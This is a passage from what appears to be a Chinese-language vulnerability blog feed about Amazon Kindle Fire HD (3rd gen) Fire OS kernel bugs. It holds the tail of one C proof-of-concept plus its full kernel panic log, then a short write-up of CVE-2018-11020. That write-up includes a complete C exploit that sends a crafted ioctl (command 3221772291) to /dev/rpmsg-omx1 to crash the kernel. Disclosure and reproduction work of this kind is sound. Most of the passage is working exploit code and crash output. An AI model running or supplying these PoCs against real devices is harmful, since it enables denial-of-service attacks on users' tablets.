class="number">0x00000006</span>,</span><br><span class="line">    <span class="number">0x00000004</span>,</span><br><span class="line">    <span class="number">0x00000000</span>,</span><br><span class="line">    <span class="number">0xbc2e9242</span>,</span><br><span class="line">    <span class="number">0x009f5f08</span>,</span><br><span class="line">    <span class="number">0x00800000</span>,</span><br><span class="line">    <span class="number">0x00000000</span>,</span><br><span class="line">    <span class="number">0x00000001</span>,</span><br><span class="line">    <span class="number">0xff8800ff</span>,</span><br><span class="line">    <span class="number">0x00000001</span>,</span><br><span class="line">    <span class="number">0x00000000</span>,</span><br><span class="line">    <span class="number">0x000003f4</span>,</span><br><span class="line">    <span class="number">0x6faa8472</span>,</span><br><span class="line">    <span class="number">0x00000400</span>,</span><br><span class="line">    <span class="number">0xec857dd5</span>,</span><br><span class="line">    <span class="number">0x00000000</span>,</span><br><span class="line">    <span class="number">0x00000040</span>,</span><br><span class="line">    <span class="number">0xffffffff</span>,</span><br><span class="line">    <span class="number">0x3f004874</span>,</span><br><span class="line">    <span class="number">0x0000b77a</span>,</span><br><span class="line">    <span class="number">0xec9acb95</span>,</span><br><span class="line">    <span class="number">0xfacc0001</span>,</span><br><span class="line">    <span class="number">0xffff0001</span>,</span><br><span class="line">    <span class="number">0x0080ffff</span>,</span><br><span class="line">    <span class="number">0x3600ff03</span>,</span><br><span class="line">    <span class="number">0x00000001</span>,</span><br><span class="line">    <span class="number">0x8fff7d7f</span>,</span><br><span class="line">    <span class="number">0x6b87075a</span>,</span><br><span class="line">    <span class="number">0x00000000</span>,</span><br><span class="line">    <span class="number">0x41414141</span>,</span><br><span class="line">    <span class="number">0x41414141</span>,</span><br><span class="line">    <span class="number">0x41414141</span>,</span><br><span class="line">    <span class="number">0x41414141</span>,</span><br><span class="line">    <span class="number">0x001001ff</span>,</span><br><span class="line">    <span class="number">0x00000000</span>,</span><br><span class="line">    <span class="number">0x00000001</span>,</span><br><span class="line">    <span class="number">0xff1f0512</span>,</span><br><span class="line">    <span class="number">0x00000001</span>,</span><br><span class="line">    <span class="number">0x51e32167</span>,</span><br><span class="line">    <span class="number">0xc18c55cc</span>,</span><br><span class="line">    <span class="number">0x00000000</span>,</span><br><span class="line">    <span class="number">0xffffffff</span>,</span><br><span class="line">    <span class="number">0xb4aaf12b</span>,</span><br><span class="line">    <span class="number">0x86edfdbd</span>,</span><br><span class="line">    <span class="number">0x00000010</span>,</span><br><span class="line">    <span class="number">0x0000003f</span>,</span><br><span class="line">    <span class="number">0xabff7b00</span>,</span><br><span class="line">    <span class="number">0xffff9ea3</span>,</span><br><span class="line">    <span class="number">0xb28e0040</span>,</span><br><span class="line">    <span class="number">0x000fffff</span>,</span><br><span class="line">    <span class="number">0x458603f4</span>,</span><br><span class="line">    <span class="number">0xffff007f</span>,</span><br><span class="line">    <span class="number">0xa9030f02</span>,</span><br><span class="line">    <span class="number">0x00000001</span>,</span><br><span class="line">    <span class="number">0x002cffff</span>,</span><br><span class="line">    <span class="number">0x9e00cdff</span>,</span><br><span class="line">    <span class="number">0x00000004</span>,</span><br><span class="line">    <span class="number">0x41414141</span>,</span><br><span class="line">    <span class="number">0x41414141</span>,</span><br><span class="line">    <span class="number">0x41414141</span>,</span><br><span class="line">    <span class="number">0x41414141</span> &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> fd = <span class="number">0</span>;</span><br><span class="line">        fd = open(driver, O_RDWR);</span><br><span class="line">        <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Failed to open %s, with errno %d\n&quot;</span>, driver, errno);</span><br><span class="line">            system(<span class="string">&quot;echo 1 &gt; /data/local/tmp/log&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Try open %s with command 0x%x.\n&quot;</span>, driver, command);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;System will crash and reboot.\n&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(ioctl(fd, command, &amp;payload) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Allocation of structs failed, %d\n&quot;</span>, errno);</span><br><span class="line">            system(<span class="string">&quot;echo 2 &gt; /data/local/tmp/log&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        close(fd);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="崩溃日志"><a href="#崩溃日志" class="headerlink" title="崩溃日志"></a>崩溃日志</h2><blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[  164.793151] Unable to handle kernel NULL pointer dereference at virtual address 00000037</span><br><span class="line">[  164.802459] pgd &#x3D; c26ec000</span><br><span class="line">[  164.805664] [00000037] *pgd&#x3D;82f42831, *pte&#x3D;00000000, *ppte&#x3D;00000000</span><br><span class="line">[  164.813415] Internal error: Oops: 17 [#1] PREEMPT SMP ARM</span><br><span class="line">[  164.819458] Modules linked in: omaplfb(O) pvrsrvkm(O) pvr_logger(O)</span><br><span class="line">[  164.827239] CPU: 1    Tainted: G           O  (3.4.83-gd2afc0bae69 #1)</span><br><span class="line">[  164.834686] PC is at dev_ioctl+0x4ac&#x2F;0x10c4</span><br><span class="line">[  164.839416] LR is at down_timeout+0x40&#x2F;0x5c</span><br><span class="line">[  164.844146] pc : [&lt;c03178e8&gt;]    lr : [&lt;c006e9b8&gt;]    psr: 60000013</span><br><span class="line">[  164.844146] sp : c25a1e70  ip : c25a1e50  fp : c25a1f04</span><br><span class="line">[  164.857116] r10: 00000000  r9 : d8c0aca8  r8 : bed5c610</span><br><span class="line">[  164.863128] r7 : c0a25b50  r6 : c25a0000  r5 : bed5c610  r4 : 0000000f</span><br><span class="line">[  164.870391] r3 : 00001403  r2 : 00000000  r1 : 20000013  r0 : 00000000</span><br><span class="line">[  164.877807] Flags: nZCv  IRQs on  FIQs on  Mode SVC_32  ISA ARM  Segment user</span><br><span class="line">[  164.885894] Control: 10c5387d  Table: 826ec04a  DAC: 00000015</span><br><span class="line">[  164.892303] </span><br><span class="line">[  164.892333] PC: 0xc0317868:</span><br><span class="line">[  164.897308] 7868  30d22003 33a03000 e3530000 0a0001c5 e3e0500d eaffff02 e1a0200d e3c26d7f</span><br><span class="line">[  164.907989] 7888  e3c6603f e5963008 e2952008 30d22003 33a03000 e3530000 1a000021 e24b3064</span><br><span class="line">[  164.918670] 78a8  e1a01005 e3a02008 e50b3088 e1a00003 ebfcfa5f e3500000 1a00001e e51b4060</span><br><span class="line">[  164.929351] 78c8  e3020710 e59f7bdc ebf4db32 e1a01000 e2870038 ebf55c25 e3500000 1a0002e0</span><br><span class="line">[  164.939880] 78e8  e5943028 e1a08000 e5940024 e1a02007 e2841024 e5803004 e5830000 e5b23070</span><br><span class="line">[  164.950561] 7908  e5871070 e2420038 e5831004 e5843024 e5842028 ebf55bb9 e50b8060 e50b8064</span><br><span class="line">[  164.961212] 7928  ea000006 e24b1064 e50b1088 e51b0088 e3a01008 ebfd0387 e3a03004 e50b3064</span><br><span class="line">[  164.971771] 7948  e5963008 e2952008 30d22003 33a03000 e3530000 1affffc5 e1a00005 e51b1088</span><br><span class="line">[  164.982299] </span><br><span class="line">[  164.982330] LR: 0xc006e938:</span><br><span class="line">[  164.987426] e938  e1a01000 0a000007 e3a05000 e2433001 e5843008 e1a00004 eb18d7ad e1a00005</span><br><span class="line">[  164.997955] e958  e24bd014 e89da830 e1a00004 e50b1018 eb18d135 e51b1018 e1a05000 eafffff4</span><br><span class="line">[  165.008636] e978  e1a0c00d e92dd878 e24cb004 e1a04000 e1a05001 eb18d91b e5943008 e3530000</span><br><span class="line">[  165.019317] e998  e1a06000 0a000007 e3a05000 e2433001 e5843008 e1a00004 e1a01006 eb18d794</span><br><span class="line">[  165.029846] e9b8  e1a00005 e89da878 e1a01005 e1a00004 eb18d158 e1a05000 eafffff5 e1a0c00d</span><br><span class="line">[  165.040374] e9d8  e92dd800 e24cb004 e5903000 e1a0c000 e3530000 0a00000b e5910008 e5932008</span><br><span class="line">[  165.051055] e9f8  e1500002 da000003 ea000006 e5932008 e1520000 ba000003 e283c004 e5933004</span><br><span class="line">[  165.061737] ea18  e3530000 1afffff8 e5813004 f57ff05f e3a00000 e58c1000 e89da800 e1a0c00d</span><br><span class="line">[  165.072265] </span><br><span class="line">[  165.072265] SP: 0xc25a1df0:</span><br><span class="line">[  165.077362] 1df0  00000001 00000004 d454d000 0000001d c25a1e3c c03178e8 60000013 ffffffff</span><br><span class="line">[  165.087890] 1e10  c25a1e5c bed5c610 c25a1f04 c25a1e28 c06a5318 c0008370 00000000 20000013</span><br><span class="line">[  165.098419] 1e30  00000000 00001403 0000000f bed5c610 c25a0000 c0a25b50 bed5c610 d8c0aca8</span><br><span class="line">[  165.109100] 1e50  00000000 c25a1f04 c25a1e50 c25a1e70 c006e9b8 c03178e8 60000013 ffffffff</span><br><span class="line">[  165.119781] 1e70  00000001 00000028 000fffff c25a1ea0 c25a1edc c25a1e90 c0207454 c00bd920</span><br><span class="line">[  165.130340] 1e90  0000001e c2db9600 c25a1ed4 c25a1ea8 ffffffff 0000000f 00000000 ffffffff</span><br><span class="line">[  165.141021] 1eb0  00000002 00000001 00000000 c25a1f14 00000000 00000001 d8c0aca8 d70c5580</span><br><span class="line">[  165.151702] 1ed0  c25a1efc c25a1ee0 c02089fc 00000000 c719ab40 00000004 c719ab40 bed5c610</span><br><span class="line">[  165.162353] </span><br><span class="line">[  165.162384] IP: 0xc25a1dd0:</span><br><span class="line">[  165.167327] 1dd0  c0070df8 c00795ac c25a0000 00000001 00000004 d454d0f4 60000013 00000001</span><br><span class="line">[  165.178009] 1df0  00000001 00000004 d454d000 0000001d c25a1e3c c03178e8 60000013 ffffffff</span><br><span class="line">[  165.188537] 1e10  c25a1e5c bed5c610 c25a1f04 c25a1e28 c06a5318 c0008370 00000000 20000013</span><br><span class="line">[  165.199249] 1e30  00000000 00001403 0000000f bed5c610 c25a0000 c0a25b50 bed5c610 d8c0aca8</span><br><span class="line">[  165.209899] 1e50  00000000 c25a1f04 c25a1e50 c25a1e70 c006e9b8 c03178e8 60000013 ffffffff</span><br><span class="line">[  165.220581] 1e70  00000001 00000028 000fffff c25a1ea0 c25a1edc c25a1e90 c0207454 c00bd920</span><br><span class="line">[  165.231109] 1e90  0000001e c2db9600 c25a1ed4 c25a1ea8 ffffffff 0000000f 00000000 ffffffff</span><br><span class="line">[  165.241790] 1eb0  00000002 00000001 00000000 c25a1f14 00000000 00000001 d8c0aca8 d70c5580</span><br><span class="line">[  165.252441] </span><br><span class="line">[  165.252441] FP: 0xc25a1e84:</span><br><span class="line">[  165.257415] 1e84  c25a1e90 c0207454 c00bd920 0000001e c2db9600 c25a1ed4 c25a1ea8 ffffffff</span><br><span class="line">[  165.268066] 1ea4  0000000f 00000000 ffffffff 00000002 00000001 00000000 c25a1f14 00000000</span><br><span class="line">[  165.278717] 1ec4  00000001 d8c0aca8 d70c5580 c25a1efc c25a1ee0 c02089fc 00000000 c719ab40</span><br><span class="line">[  165.289276] 1ee4  00000004 c719ab40 bed5c610 d8c0aca8 00000000 c25a1f74 c25a1f08 c0136044</span><br><span class="line">[  165.299926] 1f04  c0317448 00000000 00000000 00000000 00000001 00000000 dd045190 dcf8c440</span><br><span class="line">[  165.310607] 1f24  c25a1f0c c25a0000 bed5c638 bed5c610 c0085d9e c719ab40 00000004 c25a0000</span><br><span class="line">[  165.321136] 1f44  00000000 c25a1f64 00000000 bed5c610 c0085d9e c719ab40 00000004 c25a0000</span><br><span class="line">[  165.331695] 1f64  00000000 c25a1fa4 c25a1f78 c01365e0 c0135fc4 00000000 00000000 00000400</span><br><span class="line">[  165.342346] </span><br><span class="line">[  165.342376] R6: 0xc259ff80:</span><br><span class="line">[  165.347320] ff80  00000093 00000093 0000008d 00000002 00000000 00000000 00000000 00000000</span><br><span class="line">[  165.358001] ffa0  00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000</span><br><span class="line">[  165.368682] ffc0  00000093 00000093 0000008d 00000002 00000000 00000000 00000000 00000000</span><br><span class="line">[  165.379241] ffe0  00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000</span><br><span class="line">[  165.389770] 0000  00000000 00000002 00000000 d72b0980 c0a0e840 00000001 00000015 c265dc00</span><br><span class="line">[  165.400451] 0020  00000000 c25a0000 c09ddc50 d72b0980 de949300 c1620b40 c25a1b7c c25a1ac8</span><br><span class="line">[  165.411132] 0040  c06a36e4 00000000 00000000 00000000 00000000 00000000 01000000 00000000</span><br><span class="line">[  165.421661] 0060  005634c0 5ebcc27f 00000000 00000000 00000000 00000000 00000000 00000000</span><br><span class="line">[  165.432342] </span><br><span class="line">[  165.432342] R7: 0xc0a25ad0:</span><br><span class="line">[  165.437316] 5ad0  00010105 01010005 01040901 00040001 ffff0101 00000000 00000000 00040b03</span><br><span class="line">[  165.447875] 5af0  01040101 ffff0100 00000000 00000000 0000ffff 00000000 0e0c0000 01010005</span><br><span class="line">[  165.458526] 5b10  01000105 0000ffff 00000000 0e0c0000 01010005 00000105 01040901 00040001</span><br><span class="line">[  165.469207] 5b30  ffff0101 00000000 00000000 00040b03 01040101 3f3f0100 00010001 01000001</span><br><span class="line">[  165.479736] 5b50  00000000 00000000 00000001 c0a25b5c c0a25b5c c0a25b64 c0a25b64 00000000</span><br><span class="line">[  165.490417] 5b70  00000000 00000001 c0a25b78 c0a25b78 c0a25b80 c0a25b80 00000000 00000000</span><br><span class="line">[  165.500946] 5b90  00000000 c0a25b94 c0a25b94 c0a25b9c c0a25b9c 00000000 00000000 00000001</span><br><span class="line">[  165.511627] 5bb0  c0a25bb0 c0a25bb0 c0a25bb8 c0a25bb8 c0a25bc0 c0a25bc0 c0a25bc8 c0a25bc8</span><br><span class="line">[  165.522186] </span><br><span class="line">[  165.522186] R9: 0xd8c0ac28:</span><br><span class="line">[  165.527282] ac28  d8c0ac28 d8c0ac28 00000000 00000000 00000000 c06bc674 000200da c09dda58</span><br><span class="line">[  165.537841] ac48  00000000 00000000 d8c0ac50 d8c0ac50 00000000 c0aa5174 c0aa5174 c0aa5148</span><br><span class="line">[  165.548492] ac68  5aefbbda 00000000 00000000 00000000 d8c0ac80 00000000 00000000 00000000</span><br><span class="line">[  165.559020] ac88  00200000 00000000 00000000 d8c0ac94 d8c0ac94 dd3f6080 dd3f6080 00000000</span><br><span class="line">[  165.569702] aca8  000521a4 000003e8 000003e8 00000000 00000000 00000000 c06b9600 dd150400</span><br><span class="line">[  165.580261] acc8  d8c0ad80 dd3ede70 00001064 00000001 0fb00000 5aefbbda 2e19b832 5aefbbda</span><br><span class="line">[  165.590911] ace8  2e19b832 5aefbbda 2e19b832 00000000 00000000 00000000 00000000 00000000</span><br><span class="line">[  165.601593] ad08  00000000 00000000 00000000 00000000 00000001 00000000 00000000 d8c0ad24</span><br><span class="line">[  165.612121] Process gcioctl_poc (pid: 3932, stack limit &#x3D; 0xc25a02f8)</span><br><span class="line">[  165.619445] Stack: (0xc25a1e70 to 0xc25a2000)</span><br><span class="line">[  165.624359] 1e60:                                     00000001 00000028 000fffff c25a1ea0</span><br><span class="line">[  165.633605] 1e80: c25a1edc c25a1e90 c0207454 c00bd920 0000001e c2db9600 c25a1ed4 c25a1ea8</span><br><span class="line">[  165.642822] 1ea0: ffffffff 0000000f 00000000 ffffffff 00000002 00000001 00000000 c25a1f14</span><br><span class="line">[  165.652038] 1ec0: 00000000 00000001 d8c0aca8 d70c5580 c25a1efc c25a1ee0 c02089fc 00000000</span><br><span class="line">[  165.661102] 1ee0: c719ab40 00000004 c719ab40 bed5c610 d8c0aca8 00000000 c25a1f74 c25a1f08</span><br><span class="line">[  165.670318] 1f00: c0136044 c0317448 00000000 00000000 00000000 00000001 00000000 dd045190</span><br><span class="line">[  165.679565] 1f20: dcf8c440 c25a1f0c c25a0000 bed5c638 bed5c610 c0085d9e c719ab40 00000004</span><br><span class="line">[  165.688781] 1f40: c25a0000 00000000 c25a1f64 00000000 bed5c610 c0085d9e c719ab40 00000004</span><br><span class="line">[  165.697875] 1f60: c25a0000 00000000 c25a1fa4 c25a1f78 c01365e0 c0135fc4 00000000 00000000</span><br><span class="line">[  165.707092] 1f80: 00000400 bed5c638 00010e64 00000000 00000036 c0013e08 00000000 c25a1fa8</span><br><span class="line">[  165.716308] 1fa0: c0013c60 c0136578 bed5c638 00010e64 00000004 c0085d9e bed5c610 bed5c610</span><br><span class="line">[  165.725402] 1fc0: bed5c638 00010e64 00000000 00000036 00000000 00000000 00000000 bed5c624</span><br><span class="line">[  165.734619] 1fe0: 00000000 bed5c5f4 000106a4 0002918c 60000010 00000004 00000000 00000000</span><br><span class="line">[  165.743835] Backtrace: </span><br><span class="line">[  165.746856] [&lt;c031743c&gt;] (dev_ioctl+0x0&#x2F;0x10c4) from [&lt;c0136044&gt;] (do_vfs_ioctl+0x8c&#x2F;0x5b4)</span><br><span class="line">[  165.756256] [&lt;c0135fb8&gt;] (do_vfs_ioctl+0x0&#x2F;0x5b4) from [&lt;c01365e0&gt;] (sys_ioctl+0x74&#x2F;0x84)</span><br><span class="line">[  165.765502] [&lt;c013656c&gt;] (sys_ioctl+0x0&#x2F;0x84) from [&lt;c0013c60&gt;] (ret_fast_syscall+0x0&#x2F;0x30)</span><br><span class="line">[  165.774780]  r8:c0013e08 r7:00000036 r6:00000000 r5:00010e64 r4:bed5c638</span><br><span class="line">[  165.783203] Code: e2870038 ebf55c25 e3500000 1a0002e0 (e5943028) </span><br><span class="line">[  165.793060] Board Information: </span><br><span class="line">[  165.793060]  Revision : 0001</span><br><span class="line">[  165.793060]  Serial	: 0000000000000000</span><br><span class="line">[  165.793090] SoC Information:</span><br><span class="line">[  165.793090]  CPU	: OMAP4470</span><br><span class="line">[  165.793090]  Rev	: ES1.0</span><br><span class="line">[  165.793121]  Type	: HS</span><br><span class="line">[  165.793121]  Production ID: 0002B975-000000CC</span><br><span class="line">[  165.793121]  Die ID	: 1CC60000-50002FFF-0B00935D-11007004</span><br><span class="line">[  165.793121] </span><br><span class="line">[  165.844757] ---[ end trace aba846a2af6e75b7 ]---</span><br><span class="line">[  165.850097] Kernel panic - not syncing: Fatal exception</span><br><span class="line">[  165.856109] CPU0: stopping</span><br><span class="line">[  165.859252] Backtrace: </span><br><span class="line">[  165.862274] [&lt;c0018148&gt;] (dump_backtrace+0x0&#x2F;0x10c) from [&lt;c0698bb8&gt;] (dump_stack+0x18&#x2F;0x1c)</span><br><span class="line">[  165.871643]  r6:c09ddc50 r5:c09dc844 r4:00000000 r3:c0a0e950</span><br><span class="line">[  165.878784] [&lt;c0698ba0&gt;] (dump_stack+0x0&#x2F;0x1c) from [&lt;c0019bd8&gt;] (handle_IPI+0x190&#x2F;0x1c4)</span><br><span class="line">[  165.887908] [&lt;c0019a48&gt;] (handle_IPI+0x0&#x2F;0x1c4) from [&lt;c00084fc&gt;] (gic_handle_irq+0x58&#x2F;0x60)</span><br><span class="line">[  165.897399] [&lt;c00084a4&gt;] (gic_handle_irq+0x0&#x2F;0x60) from [&lt;c06a5380&gt;] (__irq_svc+0x40&#x2F;0x70)</span><br><span class="line">[  165.906707] Exception stack(0xd8dcfc38 to 0xd8dcfc80)</span><br><span class="line">[  165.912384] fc20:                                                       c153a9f8 00000000</span><br><span class="line">[  165.921600] fc40: 00000002 c153aa08 00000007 c153a9f8 d8d72210 b6eaf010 d8caee34 bab7375f</span><br><span class="line">[  165.930816] fc60: 00000001 d8dcfcac 0009eded d8dcfc80 c010a5b4 c010a5fc 20070013 ffffffff</span><br><span class="line">[  165.940032]  r6:ffffffff r5:20070013 r4:c010a5fc r3:c010a5b4</span><br><span class="line">[  165.947052] [&lt;c010a534&gt;] (follow_page+0x0&#x2F;0x238) from [&lt;c010af94&gt;] (__get_user_pages+0x13c&#x2F;0x3f0)</span><br><span class="line">[  165.957031] [&lt;c010ae58&gt;] (__get_user_pages+0x0&#x2F;0x3f0) from [&lt;c010b350&gt;] (get_user_pages+0x50&#x2F;0x58)</span><br><span class="line">[  165.967102] [&lt;c010b300&gt;] (get_user_pages+0x0&#x2F;0x58) from [&lt;c00ff544&gt;] (get_user_pages_fast+0x64&#x2F;0x7c)</span><br><span class="line">[  165.977233]  r4:d8caee3c</span><br><span class="line">[  165.980468] [&lt;c00ff4e0&gt;] (get_user_pages_fast+0x0&#x2F;0x7c) from [&lt;c01eeff0&gt;] (fuse_copy_fill+0x1bc&#x2F;0x238)</span><br><span class="line">[  165.990905] [&lt;c01eee34&gt;] (fuse_copy_fill+0x0&#x2F;0x238) from [&lt;c01ef0a4&gt;] (fuse_copy_one+0x38&#x2F;0x68)</span><br><span class="line">[  166.000579]  r6:d8dcdb00 r5:d8dce000 r4:d8dcfe24 r3:00000000</span><br><span class="line">[  166.007690] [&lt;c01ef06c&gt;] (fuse_copy_one+0x0&#x2F;0x68) from [&lt;c01efe64&gt;] (fuse_dev_do_read+0x3e4&#x2F;0x69c)</span><br><span class="line">[  166.017761]  r4:dd243c00</span><br><span class="line">[  166.020874] [&lt;c01efa80&gt;] (fuse_dev_do_read+0x0&#x2F;0x69c) from [&lt;c01f03c0&gt;] (fuse_dev_read+0x84&#x2F;0x9c)</span><br><span class="line">[  166.030853] [&lt;c01f033c&gt;] (fuse_dev_read+0x0&#x2F;0x9c) from [&lt;c0124ecc&gt;] (do_sync_read+0xb0&#x2F;0xf0)</span><br><span class="line">[  166.040222]  r7:00000000 r6:00000000 r5:00000000 r4:00000000</span><br><span class="line">[  166.047363] [&lt;c0124e1c&gt;] (do_sync_read+0x0&#x2F;0xf0) from [&lt;c01258f4&gt;] (vfs_read+0xa4&#x2F;0x148)</span><br><span class="line">[  166.056488] [&lt;c0125850&gt;] (vfs_read+0x0&#x2F;0x148) from [&lt;c01259d8&gt;] (sys_read+0x40&#x2F;0x78)</span><br><span class="line">[  166.065093]  r8:00040050 r7:b6eaf010 r6:d8e08900 r5:00000000 r4:00000000</span><br><span class="line">[  166.073547] [&lt;c0125998&gt;] (sys_read+0x0&#x2F;0x78) from [&lt;c0013c60&gt;] (ret_fast_syscall+0x0&#x2F;0x30)</span><br><span class="line">[  166.082855]  r8:c0013e08 r7:00000003 r6:b6eaf008 r5:b73828a0 r4:b6eaf010</span><br><span class="line">[  166.091217] CPU0 PC (0) : 0xc0019b2c</span><br><span class="line">[  166.095397] CPU0 PC (1) : 0xc0019b2c</span><br><span class="line">[  166.099456] CPU0 PC (2) : 0xc0019b2c</span><br><span class="line">[  166.103515] CPU0 PC (3) : 0xc0019b2c</span><br><span class="line">[  166.107574] CPU0 PC (4) : 0xc0019b2c</span><br><span class="line">[  166.111785] CPU0 PC (5) : 0xc0019b2c</span><br><span class="line">[  166.115814] CPU0 PC (6) : 0xc0019b2c</span><br><span class="line">[  166.119873] CPU0 PC (7) : 0xc0019b2c</span><br><span class="line">[  166.124084] CPU0 PC (8) : 0xc0019b2c</span><br><span class="line">[  166.128112] CPU0 PC (9) : 0xc0019b2c</span><br><span class="line">[  166.132171] CPU1 PC (0) : 0xc003ee38</span><br><span class="line">[  166.136352] CPU1 PC (1) : 0xc003ee54</span><br><span class="line">[  166.140411] CPU1 PC (2) : 0xc003ee54</span><br><span class="line">[  166.144470] CPU1 PC (3) : 0xc003ee54</span><br><span class="line">[  166.148681] CPU1 PC (4) : 0xc003ee54</span><br><span class="line">[  166.152709] CPU1 PC (5) : 0xc003ee54</span><br><span class="line">[  166.156768] CPU1 PC (6) : 0xc003ee54</span><br><span class="line">[  166.160980] CPU1 PC (7) : 0xc003ee54</span><br><span class="line">[  166.165008] CPU1 PC (8) : 0xc003ee54</span><br><span class="line">[  166.169067] CPU1 PC (9) : 0xc003ee54</span><br><span class="line">[  166.173126] </span><br><span class="line">[  166.175048] Restarting Linux version 3.4.83-gd2afc0bae69 (build@14-use1a-b-39) (gcc version 4.7 (GCC) ) #1 SMP PREEMPT Tue Sep 19 22:04:47 UTC 2017</span><br><span class="line">[  166.175079] </span><br></pre></td></tr></table></figure></blockquote>
]]></content>
      <categories>
        <category>IOT</category>
      </categories>
      <tags>
        <tag>IOT</tag>
        <tag>Amazon</tag>
      </tags>
  </entry>
  <entry>
    <title>（CVE-2018-11020）Amazon Kindle Fire HD (3rd) Fire OS kernel组件安全漏洞</title>
    <url>/2020/09/12/IOT/Exploit/Amazon%20Kindle%20Fire%20HD(3rd)/%EF%BC%88CVE-2018-11020%EF%BC%89Amazon-Kindle-Fire-HD-3rd-Fire-OS-kernel%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><blockquote>
<p>Amazon Kindle Fire HD（3rd）Fire OS 4.5.5.3内核组件中的内核模块/omap/drivers/rpmsg/rpmsg_omx.c允许攻击者通过设备文件/ dev / rpmsg-上的ioctl的参数注入特制的参数使用命令<strong>3221772291的omx1</strong>，并导致内核崩溃。</p>
<p>要探索此漏洞，必须打开设备文件/ dev / rpmsg-omx1，并使用命令<strong>3221772291</strong>和精心设计的有效负载作为第三个参数来对该设备文件进行ioctl系统调用。</p>
</blockquote>
<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Fire OS 4.5.5.3</p>
<a id="more"></a>

<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>poc</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * This is poc of Kindle Fire HD 3rd</span></span><br><span class="line"><span class="comment"> * A bug in the ioctl interface of device file /dev/rpmsg-omx1 causes the system crash via IOCTL 3221772291.</span></span><br><span class="line"><span class="comment"> * Related buggy struct name is gcicommit.</span></span><br><span class="line"><span class="comment"> * This Poc should run with permission to do ioctl on /dev/rpmsg-omx1.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * The fowllwing is kmsg of kernel crash infomation:</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">static</span> <span class="keyword">char</span> *driver = <span class="string">&quot;/dev/rpmsg-omx1&quot;</span>;</span><br><span class="line"><span class="keyword">static</span> command = <span class="number">3221772291</span>; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv, <span class="keyword">char</span> **env)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> payload[] = &#123; <span class="number">0xb5d18de2</span>, <span class="number">0xf6e48a17</span>, <span class="number">0x9179c429</span>, <span class="number">0x89a32e03</span> &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> fd = <span class="number">0</span>;</span><br><span class="line">        fd = open(driver, O_RDWR);</span><br><span class="line">        <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Failed to open %s, with errno %d\n&quot;</span>, driver, errno);</span><br><span class="line">            system(<span class="string">&quot;echo 1 &gt; /data/local/tmp/log&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Try open %s with command 0x%x.\n&quot;</span>, driver, command);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;System will crash and reboot.\n&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(ioctl(fd, command, &amp;payload) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Allocation of structs failed, %d\n&quot;</span>, errno);</span><br><span class="line">            system(<span class="string">&quot;echo 2 &gt; /data/local/tmp/log&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        close(fd);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="崩溃日志"><a href="#崩溃日志" class="headerlink" title="崩溃日志"></a>崩溃日志</h2><blockquote>
